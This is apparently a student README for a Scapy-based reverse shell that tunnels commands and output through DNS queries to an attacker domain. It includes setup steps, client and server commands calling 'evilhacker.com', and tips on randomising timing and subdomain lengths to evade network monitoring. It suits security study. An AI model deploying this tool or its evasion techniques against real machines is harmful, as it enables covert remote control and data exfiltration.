# Reverse Shell using DNS tunnelling

Written in Scapy for my network security module :)

## Usage

Make sure to run the server first.

### Server

1. Purchase a domain (for example, `evilhacker.com`)
2. Set an `A` record for `*.evilhacker.com` and point to server IP address
3. Set an `NS` record for `ns1.evilhacker.com` and point to `ns1.evilhacker.com`

```sh
$ ./dns_server.py -h
usage: dns_server.py [-h] [-i INTERFACE] -k KEY domain

DNS Reverse Shell Server

positional arguments:
  domain                Domain to connect to

optional arguments:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Interface to use
  -k KEY, --key KEY     Password to use

# ./dns_server.py -k securepassword evilhacker.com
```

Program will now listen on stdin for commands

---

### Client

```sh
$ ./dns_client.py -h
usage: dns_client.py [-h] [-i INTERFACE] [-I INTERVAL] [-p PULSE] [-t TIMEOUT] -k KEY domain

DNS Reverse Shell Client

positional arguments:
  domain                Domain to connect to

optional arguments:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Interface to use
  -I INTERVAL, --interval INTERVAL
                        Interval between sending DNS packets
  -p PULSE, --pulse PULSE
                        How often to pulse the server in seconds (Lower number means faster response time)
  -t TIMEOUT, --timeout TIMEOUT
                        How long it takes to recover from lost packet in seconds (Lower number means faster recover time)
  -k KEY, --key KEY     Password to use

# ./dns_client.py -k securepassword evilhacker.com
```

## How it works

Every few seconds, the client program sends a DNS A record query “pulse.evilhacker.com” and listens for any commands that the server gives. When a shell command is received, the subdomain is base64 decoded and runs on the victim machine. The standard output or error is then encoded in base64 and fragmented into multiple parts as there is a maximum length for the domain. The fragmented data is then sent, with the “z” flag in the DNS packet used to indicate the last packet from the command output.

The server program sniffs and filters out only DNS traffic on the indicated network interface. It captures the DNS queries from the server, strips out the subdomain, reconstructs the fragmented base64 data and prints it to terminal output. Similar to the client program, any command that is longer than the maximum length allowed for the domain is fragmented with the “z” flag used to indicate the last packet from the command.

However, there are certain caveats to this program. Due to the nature of UDP, it is possible that some data can be lost in the middle of a transaction. This is very apparent when dealing with slow networks. An increased interval between each packet sent (more information in the program usage) can boost the reliability and covertness of the reverse shell.

### Improvements

Randomising the subdomain length can also be used to throw off automated network traffic analysis tools as it may be filtering for subdomains within a certain length at the cost of network traffic overhead.

Randomising the pulse and intervals between each packet sent can prevent network administrators or automated network traffic analysis tools from detection and correlation between packets. However, this significantly reduces the responsiveness of the reverse shell.
